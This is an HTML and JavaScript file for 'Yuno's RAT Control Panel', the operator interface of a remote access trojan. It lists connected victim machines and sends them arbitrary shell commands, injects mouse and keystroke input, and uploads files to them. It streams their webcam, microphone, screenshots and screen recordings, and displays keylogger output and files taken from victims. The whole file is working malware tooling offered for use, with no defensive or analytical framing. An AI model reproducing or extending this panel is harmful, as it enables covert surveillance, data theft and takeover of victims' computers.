<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yuno's RAT Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f0f0f0; }
        .container { max-width: 1200px; margin: auto; }
        .section { background: white; padding: 15px; margin-bottom: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .client-list, .command-input { display: flex; flex-wrap: wrap; gap: 10px; }
        .client-card { background: #e0e0e0; padding: 10px; border-radius: 5px; width: 200px; }
        #commandOutput, #clientInfo, #webcamFeed, #screenshotPreview, #micAudio, #screenRecord { margin-top: 10px; }
        button, input[type="text"] { padding: 5px 10px; }
        #webcamFeed, #screenshotPreview, #screenRecord { max-width: 100%; height: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Yuno's RAT Control Panel</h1>
        <div class="section">
            <h2>Connected Clients</h2>
            <div id="clientList" class="client-list"></div>
            <div id="clientInfo"></div>
        </div>
        <div class="section">
            <h2>Command Input</h2>
            <div class="command-input">
                <input type="text" id="commandInput" placeholder="Enter command...">
                <button onclick="sendCommand()">Send</button>
                <button onclick="sendRemoteInput('mouse_move', {x: 100, y: 100})">Move Mouse</button>
                <button onclick="sendRemoteInput('mouse_click', {button: 'left', pressed: true})">Left Click</button>
                <button onclick="sendRemoteInput('key_press', {key: 'a', pressed: true})">Press 'a'</button>
                <button onclick="uploadFile()">Upload File</button>
                <button onclick="startWebcam()">Start Webcam</button>
                <button onclick="takeScreenshot()">Take Screenshot</button>
                <button onclick="recordMic()">Record Mic</button>
                <button onclick="startScreenRecord()">Start Screen Record</button>
                <button onclick="stopScreenRecord()">Stop Screen Record</button>
                <button onclick="toggleNetwork()">Toggle Network</button>
                <button onclick="toggleCPU()">Toggle CPU</button>
            </div>
            <div id="commandOutput"></div>
        </div>
        <div class="section">
            <h2>Webcam Feed</h2>
            <img id="webcamFeed" src="" alt="Webcam Feed">
        </div>
        <div class="section">
            <h2>Screenshot Preview</h2>
            <img id="screenshotPreview" src="" alt="Screenshot Preview">
        </div>
        <div class="section">
            <h2>Mic Audio</h2>
            <audio id="micAudio" controls></audio>
        </div>
        <div class="section">
            <h2>Screen Record</h2>
            <video id="screenRecord" controls></video>
        </div>
        <div class="section">
            <h2>Keylog Data</h2>
            <pre id="keylogData"></pre>
        </div>
    </div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io('http://localhost:5000');

        socket.on('connect', () => console.log('Connected to server'));
        socket.on('disconnect', () => console.log('Disconnected from server'));

        socket.on('client_info', (clients) => {
            const clientList = document.getElementById('clientList');
            clientList.innerHTML = '';
            clients.forEach(client => {
                const card = document.createElement('div');
                card.className = 'client-card';
                card.innerHTML = `ID: ${client.id}<br>OS: ${client.system.system.os}<br>Status: ${client.activity.status}`;
                clientList.appendChild(card);
            });
            document.getElementById('clientInfo').textContent = JSON.stringify(clients, null, 2);
        });

        socket.on('command_output', (data) => {
            const output = document.getElementById('commandOutput');
            output.innerHTML += `<p>Client ${data.client_id}: ${data.command} -> ${data.output}</p>`;
        });

        socket.on('webcam_error', (data) => console.error(`Webcam Error (${data.client_id}): ${data.message}`));
        socket.on('mic_error', (data) => console.error(`Mic Error (${data.client_id}): ${data.message}`));
        socket.on('screenshot_error', (data) => console.error(`Screenshot Error (${data.client_id}): ${data.message}`));
        socket.on('screen_record_error', (data) => console.error(`Screen Record Error (${data.client_id}): ${data.message}`));

        socket.on('network_data', (data) => console.log(`Network Data (${data.client_id}):`, data));
        socket.on('system_data', (data) => console.log(`System Data (${data.client_id}):`, data));
        socket.on('screen_record', (data) => {
            const video = document.getElementById('screenRecord');
            const blob = new Blob([new Uint8Array(atob(data.frames[0]).split('').map(c => c.charCodeAt(0)))], { type: 'image/jpeg' });
            video.src = URL.createObjectURL(blob);
        });
        socket.on('keylog_data', (data) => {
            document.getElementById('keylogData').textContent = data.logs;
        });
        socket.on('file_download', (data) => {
            const link = document.createElement('a');
            link.href = `data:application/octet-stream;base64,${data.data}`;
            link.download = data.filename;
            link.click();
        });

        function sendCommand() {
            const command = document.getElementById('commandInput').value;
            socket.emit('command', command);
            document.getElementById('commandInput').value = '';
        }

        function sendRemoteInput(type, data) {
            socket.emit('remote_input', { type, ...data });
        }

        function uploadFile() {
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.onchange = (e) => {
                const file = e.target.files[0];
                const reader = new FileReader();
                reader.onload = (event) => {
                    const data = event.target.result.split(',')[1]; // Get base64 data
                    socket.emit('upload_file', { filename: file.name, data });
                };
                reader.readAsDataURL(file);
            };
            fileInput.click();
        }

        function startWebcam() { socket.emit('command', 'webcam'); }
        function takeScreenshot() { socket.emit('command', 'screenshot'); }
        function recordMic() { socket.emit('command', 'mic'); }
        function startScreenRecord() { socket.emit('command', 'start_record'); }
        function stopScreenRecord() { socket.emit('command', 'stop_record'); }
        function toggleNetwork() { socket.emit('command', 'toggle_network'); }
        function toggleCPU() { socket.emit('command', 'toggle_cpu'); }
    </script>
</body>
</html>
